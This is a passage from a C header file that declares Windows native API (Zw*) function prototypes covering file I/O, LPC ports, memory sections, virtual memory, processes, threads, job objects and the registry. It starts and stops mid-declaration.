    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass,
    IN BOOLEAN ReturnSingleEntry,
    IN OPTIONAL PUNICODE_STRING FileName,
    IN BOOLEAN RestartScan
    );



NTSTATUS
NTAPI
ZwQueryInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );



NTSTATUS
NTAPI
ZwQueryQuotaInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN OPTIONAL PVOID  SidList,
    IN ULONG SidListLength,
    IN OPTIONAL PSID StartSid,
    IN BOOLEAN RestartScan
    );



NTSTATUS
NTAPI
ZwQueryVolumeInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FsInformation,
    IN ULONG Length,
    IN FS_INFORMATION_CLASS FsInformationClass
    );



NTSTATUS
NTAPI
ZwReadFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );



NTSTATUS
NTAPI
ZwSetInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );



NTSTATUS
NTAPI
ZwSetQuotaInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length
    );



NTSTATUS
NTAPI
ZwSetVolumeInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID FsInformation,
    IN ULONG Length,
    IN FS_INFORMATION_CLASS FsInformationClass
    );



NTSTATUS
NTAPI
ZwWriteFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );



NTSTATUS
NTAPI
ZwUnlockFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER ByteOffset,
    IN PLARGE_INTEGER Length,
    IN ULONG Key
    );



NTSTATUS
NTAPI
ZwReadFileScatter (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PFILE_SEGMENT_ELEMENT SegmentArray,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );



NTSTATUS
NTAPI
ZwSetEaFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length
    );



NTSTATUS
NTAPI
ZwWriteFileGather (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PFILE_SEGMENT_ELEMENT SegmentArray,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );



NTSTATUS
NTAPI
ZwLoadDriver (
    IN PUNICODE_STRING DriverServiceName
    );



NTSTATUS
NTAPI
ZwUnloadDriver (
    IN PUNICODE_STRING DriverServiceName
    );



NTSTATUS
NTAPI
ZwCreateIoCompletion (
    OUT PHANDLE IoCompletionHandle,
	IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG Count OPTIONAL
    );



NTSTATUS
NTAPI
ZwOpenIoCompletion (
    OUT PHANDLE IoCompletionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwQueryIoCompletion (
    IN HANDLE IoCompletionHandle,
    IN IO_COMPLETION_INFORMATION_CLASS IoCompletionInformationClass,
    OUT PVOID IoCompletionInformation,
    IN ULONG IoCompletionInformationLength,
		OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetIoCompletion (
    IN HANDLE IoCompletionHandle,
    IN PVOID KeyContext,
    IN OPTIONAL PVOID ApcContext,
    IN NTSTATUS IoStatus,
    IN ULONG_PTR IoStatusInformation
    );



NTSTATUS
NTAPI
ZwRemoveIoCompletion (
    IN HANDLE IoCompletionHandle,
    OUT PVOID *KeyContext,
    OUT PVOID *ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwCallbackReturn (
    IN PVOID OutputBuffer OPTIONAL,
    IN ULONG OutputLength,
    IN NTSTATUS Status
    );



NTSTATUS
NTAPI
ZwQueryDebugFilterState (
    IN ULONG ComponentId,
    IN ULONG Level
    );



NTSTATUS
NTAPI
ZwSetDebugFilterState (
    IN ULONG ComponentId,
    IN ULONG Level,
    IN BOOLEAN State
    );



NTSTATUS
NTAPI
ZwYieldExecution (
    VOID
    );



NTSTATUS
NTAPI
ZwCreatePort(
    OUT PHANDLE PortHandle,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG MaxConnectionInfoLength,
    IN ULONG MaxMessageLength,
    IN OPTIONAL ULONG MaxPoolUsage
    );



NTSTATUS
NTAPI
ZwCreateWaitablePort(
    OUT PHANDLE PortHandle,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG MaxConnectionInfoLength,
    IN ULONG MaxMessageLength,
    IN OPTIONAL ULONG MaxPoolUsage
    );



NTSTATUS
NTAPI
ZwConnectPort(
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    IN OUT OPTIONAL PPORT_VIEW ClientView,
    IN OUT OPTIONAL PREMOTE_PORT_VIEW ServerView,
    OUT OPTIONAL PULONG MaxMessageLength,
    IN OUT OPTIONAL PVOID ConnectionInformation,
    IN OUT OPTIONAL PULONG ConnectionInformationLength
    );



NTSTATUS
NTAPI
ZwSecureConnectPort(
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    IN OUT OPTIONAL PPORT_VIEW ClientView,
    IN OPTIONAL PSID RequiredServerSid,
    IN OUT OPTIONAL PREMOTE_PORT_VIEW ServerView,
    OUT OPTIONAL PULONG MaxMessageLength,
    IN OUT OPTIONAL PVOID ConnectionInformation,
    IN OUT OPTIONAL PULONG ConnectionInformationLength
    );



NTSTATUS
NTAPI
ZwListenPort(
    IN HANDLE PortHandle,
    OUT PPORT_MESSAGE ConnectionRequest
    );



NTSTATUS
NTAPI
ZwAcceptConnectPort(
    OUT PHANDLE PortHandle,
    IN OPTIONAL PVOID PortContext,
    IN PPORT_MESSAGE ConnectionRequest,
    IN BOOLEAN AcceptConnection,
    IN OUT OPTIONAL PPORT_VIEW ServerView,
    OUT OPTIONAL PREMOTE_PORT_VIEW ClientView
    );



NTSTATUS
NTAPI
ZwCompleteConnectPort(
    IN HANDLE PortHandle
    );



NTSTATUS
NTAPI
ZwRequestPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE RequestMessage
    );



NTSTATUS
NTAPI
ZwRequestWaitReplyPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE RequestMessage,
    OUT PPORT_MESSAGE ReplyMessage
    );



NTSTATUS
NTAPI
ZwReplyPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE ReplyMessage
    );



NTSTATUS
NTAPI
ZwReplyWaitReplyPort(
    IN HANDLE PortHandle,
    IN OUT PPORT_MESSAGE ReplyMessage
    );



NTSTATUS
NTAPI
ZwReplyWaitReceivePort(
    IN HANDLE PortHandle,
    OUT OPTIONAL PVOID *PortContext ,
    IN OPTIONAL PPORT_MESSAGE ReplyMessage,
    OUT PPORT_MESSAGE ReceiveMessage
    );



NTSTATUS
NTAPI
ZwReplyWaitReceivePortEx(
    IN HANDLE PortHandle,
    OUT OPTIONAL PVOID *PortContext,
    IN OPTIONAL PPORT_MESSAGE ReplyMessage,
    OUT PPORT_MESSAGE ReceiveMessage,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwImpersonateClientOfPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE Message
    );



NTSTATUS
NTAPI
ZwReadRequestData(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE Message,
    IN ULONG DataEntryIndex,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesRead
    );



NTSTATUS
NTAPI
ZwWriteRequestData(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE Message,
    IN ULONG DataEntryIndex,
    IN PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesWritten
    );



NTSTATUS
NTAPI
ZwQueryInformationPort(
    IN HANDLE PortHandle,
    IN PORT_INFORMATION_CLASS PortInformationClass,
    OUT PVOID PortInformation,
    IN ULONG Length,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwCreateSection (
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PLARGE_INTEGER MaximumSize,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN OPTIONAL HANDLE FileHandle
    );



NTSTATUS
NTAPI
ZwOpenSection (
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwMapViewOfSection (
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT  PVOID *BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT  OPTIONAL PLARGE_INTEGER SectionOffset,
    IN OUT  PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
    );



NTSTATUS
NTAPI
ZwUnmapViewOfSection (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress
    );



NTSTATUS
NTAPI
ZwExtendSection (
    IN HANDLE SectionHandle,
    IN OUT PLARGE_INTEGER NewSectionSize
    );



NTSTATUS
NTAPI
ZwAreMappedFilesTheSame (
    IN PVOID File1MappedAsAnImage,
    IN PVOID File2MappedAsFile
    );



NTSTATUS
NTAPI
ZwAllocateVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
    );



NTSTATUS
NTAPI
ZwFreeVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG FreeType
    );



NTSTATUS
NTAPI
ZwReadVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesRead
    );



NTSTATUS
NTAPI
ZwWriteVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    IN CONST VOID *Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesWritten
    );



NTSTATUS
NTAPI
ZwFlushVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    OUT PIO_STATUS_BLOCK IoStatus
    );



NTSTATUS
NTAPI
ZwLockVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG MapType
    );



NTSTATUS
NTAPI
ZwUnlockVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG MapType
    );



NTSTATUS
NTAPI
ZwProtectVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
    );



NTSTATUS
NTAPI
ZwQueryVirtualMemory (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN MEMORY_INFORMATION_CLASS MemoryInformationClass,
    OUT PVOID MemoryInformation,
    IN SIZE_T MemoryInformationLength,
    OUT OPTIONAL PSIZE_T ReturnLength
    );



NTSTATUS
NTAPI
ZwQuerySection (
    IN HANDLE SectionHandle,
    IN SECTION_INFORMATION_CLASS SectionInformationClass,
    OUT PVOID SectionInformation,
    IN SIZE_T SectionInformationLength,
    OUT OPTIONAL PSIZE_T ReturnLength
    );



NTSTATUS
NTAPI
ZwMapUserPhysicalPages (
    IN PVOID VirtualAddress,
    IN ULONG_PTR NumberOfPages,
    IN OPTIONAL PULONG_PTR UserPfnArray
    );



NTSTATUS
NTAPI
ZwMapUserPhysicalPagesScatter (
    IN PVOID *VirtualAddresses,
    IN ULONG_PTR NumberOfPages,
    IN OPTIONAL PULONG_PTR UserPfnArray
    );



NTSTATUS
NTAPI
ZwAllocateUserPhysicalPages (
    IN HANDLE ProcessHandle,
    IN OUT PULONG_PTR NumberOfPages,
    OUT PULONG_PTR UserPfnArray
    );



NTSTATUS
NTAPI
ZwFreeUserPhysicalPages (
    IN HANDLE ProcessHandle,
    IN OUT PULONG_PTR NumberOfPages,
    IN PULONG_PTR UserPfnArray
    );



NTSTATUS
NTAPI
ZwGetWriteWatch (
    IN HANDLE ProcessHandle,
    IN ULONG Flags,
    IN PVOID BaseAddress,
    IN SIZE_T RegionSize,
    OUT PVOID *UserAddressArray,
    IN OUT PULONG_PTR EntriesInUserAddressArray,
    OUT PULONG Granularity
    );



NTSTATUS
NTAPI
ZwResetWriteWatch (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN SIZE_T RegionSize
    );



NTSTATUS
NTAPI
ZwCreatePagingFile (
    IN PUNICODE_STRING PageFileName,
    IN PLARGE_INTEGER MinimumSize,
    IN PLARGE_INTEGER MaximumSize,
    IN ULONG Priority
    );



NTSTATUS
NTAPI
ZwFlushInstructionCache (
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    IN SIZE_T Length
    );



NTSTATUS
NTAPI
ZwFlushWriteBuffer (
    VOID
    );



NTSTATUS
NTAPI
ZwQueryObject (
    IN HANDLE Handle,
    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
    OUT PVOID ObjectInformation,
    IN ULONG ObjectInformationLength,
    OUT PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetInformationObject (
    IN HANDLE Handle,
    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
    IN PVOID ObjectInformation,
    IN ULONG ObjectInformationLength
    );



NTSTATUS
NTAPI
ZwDuplicateObject (
    IN HANDLE SourceProcessHandle,
    IN HANDLE SourceHandle,
    IN OPTIONAL HANDLE TargetProcessHandle,
    OUT PHANDLE TargetHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Options
    );



NTSTATUS
NTAPI
ZwMakeTemporaryObject (
    IN HANDLE Handle
    );



NTSTATUS
NTAPI
ZwMakePermanentObject (
    IN HANDLE Handle
    );



NTSTATUS
NTAPI
ZwSignalAndWaitForSingleObject (
    IN HANDLE SignalHandle,
    IN HANDLE WaitHandle,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwWaitForSingleObject (
    IN HANDLE Handle,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwWaitForMultipleObjects (
    IN ULONG Count,
    IN HANDLE Handles[],
    IN WAIT_TYPE WaitType,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwWaitForMultipleObjects32 (
    IN ULONG Count,
    IN LONG Handles[],
    IN WAIT_TYPE WaitType,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwSetSecurityObject (
    IN HANDLE Handle,
    IN SECURITY_INFORMATION SecurityInformation,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor
    );



NTSTATUS
NTAPI
ZwQuerySecurityObject (
    IN HANDLE Handle,
    IN SECURITY_INFORMATION SecurityInformation,
    OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN ULONG Length,
    OUT PULONG LengthNeeded
    );



NTSTATUS
NTAPI
ZwClose (
    IN HANDLE Handle
    );



NTSTATUS
NTAPI
ZwCreateDirectoryObject (
    OUT PHANDLE DirectoryHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwOpenDirectoryObject (
    OUT PHANDLE DirectoryHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwQueryDirectoryObject (
    IN HANDLE DirectoryHandle,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN BOOLEAN RestartScan,
    IN OUT  PULONG Context,
    OUT PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwCreateSymbolicLinkObject (
    OUT PHANDLE LinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PUNICODE_STRING LinkTarget
    );



NTSTATUS
NTAPI
ZwOpenSymbolicLinkObject (
    OUT PHANDLE LinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwQuerySymbolicLinkObject (
    IN HANDLE LinkHandle,
    IN OUT  PUNICODE_STRING LinkTarget,
    OUT PULONG ReturnedLength
    );



NTSTATUS
NTAPI
ZwGetPlugPlayEvent (
    IN HANDLE EventHandle,
    IN OPTIONAL PVOID Context,
    OUT PPLUGPLAY_EVENT_BLOCK EventBlock,
    IN  ULONG EventBufferSize
    );



NTSTATUS
NTAPI
ZwPlugPlayControl(
    IN PLUGPLAY_CONTROL_CLASS PnPControlClass,
    IN OUT PVOID PnPControlData,
    IN ULONG PnPControlDataLength
    );



NTSTATUS
NTAPI
ZwPowerInformation(
    IN POWER_INFORMATION_LEVEL InformationLevel,
    IN OPTIONAL PVOID InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID OutputBuffer,
    IN ULONG OutputBufferLength
    );



NTSTATUS
NTAPI
ZwSetThreadExecutionState(
    IN EXECUTION_STATE esFlags,               // ES_xxx flags
    OUT EXECUTION_STATE *PreviousFlags
    );



NTSTATUS
NTAPI
ZwRequestWakeupLatency(
    IN LATENCY_TIME latency
    );



// NTSTATUS
// NTAPI
// ZwInitiatePowerAction(
//     IN POWER_ACTION SystemAction,
//     IN SYSTEM_POWER_STATE MinSystemState,
//     IN ULONG Flags,                 // POWER_ACTION_xxx flags
//     IN BOOLEAN Asynchronous
//     );



// NTSTATUS
// NTAPI
// ZwSetSystemPowerState(
//     IN POWER_ACTION SystemAction,
//     IN SYSTEM_POWER_STATE MinSystemState,
//     IN ULONG Flags                  // POWER_ACTION_xxx flags
//     );



// NTSTATUS
// NTAPI
// ZwGetDevicePowerState(
//     IN HANDLE Device,
//     OUT DEVICE_POWER_STATE *State
//     );



NTSTATUS
NTAPI
ZwCancelDeviceWakeupRequest(
    IN HANDLE Device
    );



NTSTATUS
NTAPI
ZwRequestDeviceWakeup(
    IN HANDLE Device
    );



NTSTATUS
NTAPI
ZwCreateProcess (
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ParentProcess,
    IN BOOLEAN InheritObjectTable,
    IN OPTIONAL HANDLE SectionHandle,
    IN OPTIONAL HANDLE DebugPort,
    IN OPTIONAL HANDLE ExceptionPort
    );



NTSTATUS
NTAPI
ZwCreateProcessEx (
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN OPTIONAL HANDLE SectionHandle,
    IN OPTIONAL HANDLE DebugPort,
    IN OPTIONAL HANDLE ExceptionPort,
    IN ULONG JobMemberLevel
    );



NTSTATUS
NTAPI
ZwOpenProcess (
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PCLIENT_ID ClientId
    );



NTSTATUS
NTAPI
ZwTerminateProcess (
    IN OPTIONAL HANDLE ProcessHandle,
    IN NTSTATUS ExitStatus
    );



NTSTATUS
NTAPI
ZwQueryInformationProcess (
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwGetNextProcess (
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewProcessHandle
    );



NTSTATUS
NTAPI
ZwGetNextThread (
    IN HANDLE ProcessHandle,
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewThreadHandle
    );



NTSTATUS
NTAPI
ZwQueryPortInformationProcess (
    VOID
    );



NTSTATUS
NTAPI
ZwSetInformationProcess (
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    IN PVOID ProcessInformation,
    IN ULONG ProcessInformationLength
    );



NTSTATUS
NTAPI
ZwCreateThread (
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ProcessHandle,
    OUT PCLIENT_ID ClientId,
    IN PCONTEXT ThreadContext,
    IN PINITIAL_TEB InitialTeb,
    IN BOOLEAN CreateSuspended
    );



NTSTATUS
NTAPI
ZwOpenThread (
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PCLIENT_ID ClientId
    );



NTSTATUS
NTAPI
ZwTerminateThread (
    IN OPTIONAL HANDLE ThreadHandle,
    IN NTSTATUS ExitStatus
    );



NTSTATUS
NTAPI
ZwSuspendThread (
    IN HANDLE ThreadHandle,
    OUT OPTIONAL PULONG PreviousSuspendCount
    );



NTSTATUS
NTAPI
ZwResumeThread (
    IN HANDLE ThreadHandle,
    OUT OPTIONAL PULONG PreviousSuspendCount
    );



NTSTATUS
NTAPI
ZwSuspendProcess (
    IN HANDLE ProcessHandle
    );



NTSTATUS
NTAPI
ZwResumeProcess (
    IN HANDLE ProcessHandle
    );



NTSTATUS
NTAPI
ZwGetContextThread (
    IN HANDLE ThreadHandle,
    IN OUT PCONTEXT ThreadContext
    );



NTSTATUS
NTAPI
ZwSetContextThread (
    IN HANDLE ThreadHandle,
    IN PCONTEXT ThreadContext
    );



NTSTATUS
NTAPI
ZwQueryInformationThread (
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    OUT PVOID ThreadInformation,
    IN ULONG ThreadInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetInformationThread (
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    IN PVOID ThreadInformation,
    IN ULONG ThreadInformationLength
    );



NTSTATUS
NTAPI
ZwAlertThread (
    IN HANDLE ThreadHandle
    );



NTSTATUS
NTAPI
ZwAlertResumeThread (
    IN HANDLE ThreadHandle,
    OUT OPTIONAL PULONG PreviousSuspendCount
    );



NTSTATUS
NTAPI
ZwImpersonateThread (
    IN HANDLE ServerThreadHandle,
    IN HANDLE ClientThreadHandle,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos
    );



NTSTATUS
NTAPI
ZwTestAlert (
    VOID
    );



NTSTATUS
NTAPI
ZwRegisterThreadTerminatePort (
    IN HANDLE PortHandle
    );



NTSTATUS
NTAPI
ZwSetLdtEntries (
    IN ULONG Selector0,
    IN ULONG Entry0Low,
    IN ULONG Entry0Hi,
    IN ULONG Selector1,
    IN ULONG Entry1Low,
    IN ULONG Entry1Hi
    );



NTSTATUS
NTAPI
ZwQueueApcThread (
    IN HANDLE ThreadHandle,
    IN PPS_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcArgument1,
    IN OPTIONAL PVOID ApcArgument2,
    IN OPTIONAL PVOID ApcArgument3
    );



NTSTATUS
NTAPI
ZwCreateJobObject (
    OUT PHANDLE JobHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwOpenJobObject (
    OUT PHANDLE JobHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwAssignProcessToJobObject (
    IN HANDLE JobHandle,
    IN HANDLE ProcessHandle
    );



NTSTATUS
NTAPI
ZwTerminateJobObject (
    IN HANDLE JobHandle,
    IN NTSTATUS ExitStatus
    );



NTSTATUS
NTAPI
ZwIsProcessInJob (
    IN HANDLE ProcessHandle,
    IN OPTIONAL HANDLE JobHandle
    );



NTSTATUS
NTAPI
ZwCreateJobSet (
    IN ULONG NumJob,
    IN PJOB_SET_ARRAY UserJobSet,
    IN ULONG Flags
    );



NTSTATUS
NTAPI
ZwQueryInformationJobObject (
    IN OPTIONAL HANDLE JobHandle,
    IN JOBOBJECTINFOCLASS JobObjectInformationClass,
    OUT PVOID JobObjectInformation,
    IN ULONG JobObjectInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetInformationJobObject (
    IN HANDLE JobHandle,
    IN JOBOBJECTINFOCLASS JobObjectInformationClass,
    IN PVOID JobObjectInformation,
    IN ULONG JobObjectInformationLength
    );



NTSTATUS
NTAPI
ZwCreateKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    ULONG TitleIndex,
    IN OPTIONAL PUNICODE_STRING Class,
    IN ULONG CreateOptions,
    OUT OPTIONAL PULONG Disposition
    );



NTSTATUS
NTAPI
ZwDeleteKey(
    IN HANDLE KeyHandle
    );



NTSTATUS
NTAPI
ZwDeleteValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName
    );



NTSTATUS
NTAPI
ZwEnumerateKey(
    IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_INFORMATION_CLASS KeyInformationClass,
    OUT OPTIONAL PVOID KeyInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );



NTSTATUS
NTAPI
ZwEnumerateValueKey(
    IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT OPTIONAL PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );



NTSTATUS
NTAPI
ZwFlushKey(
    IN HANDLE KeyHandle
    );



NTSTATUS
NTAPI
ZwInitializeRegistry(
    IN USHORT BootCondition
    );



NTSTATUS
NTAPI
ZwNotifyChangeKey(
    IN HANDLE KeyHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG CompletionFilter,
    IN BOOLEAN WatchTree,
    OUT OPTIONAL PVOID Buffer,
    IN ULONG BufferSize,
    IN BOOLEAN Asynchronous
    );



NTSTATUS
NTAPI
ZwNotifyChangeMultipleKeys(
    IN HANDLE MasterKeyHandle,
    IN OPTIONAL ULONG Count,
    IN OPTIONAL OBJECT_ATTRIBUTES SlaveObjects[],
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
